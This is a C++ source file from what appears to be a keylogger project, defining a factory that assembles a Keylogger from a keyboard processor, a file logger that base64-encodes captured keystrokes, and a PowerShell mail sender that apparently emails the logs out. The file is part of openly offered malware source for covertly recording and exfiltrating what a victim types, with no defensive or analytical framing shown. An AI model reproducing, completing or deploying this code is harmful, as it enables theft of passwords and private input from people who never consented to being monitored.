#include "KeyloggerFactory.h"

#include "Base64Encryptor.h"
#include "DefaultFileSystemAccess.h"
#include "KeyboardProcessor.h"
#include "Keylogger.h"
#include "PowerShellMailSender.h"

namespace keylogger
{
std::unique_ptr<Keylogger> KeyloggerFactory::createKeylogger()
{
    std::shared_ptr<FileSystemAccess> fileSystem = std::make_shared<keylogger::DefaultFileSystemAccess>();
    std::unique_ptr<mail::MailSender> mailSender = std::make_unique<mail::PowerShellMailSender>(
        std::make_unique<mail::PowerShellSendMailScriptCreator>(fileSystem));
    return std::make_unique<Keylogger>(
        std::move(mailSender), std::make_unique<KeyboardProcessor>(),
        std::make_unique<UserInputFileLogger>(fileSystem, std::make_unique<Base64Encryptor>()));
}
}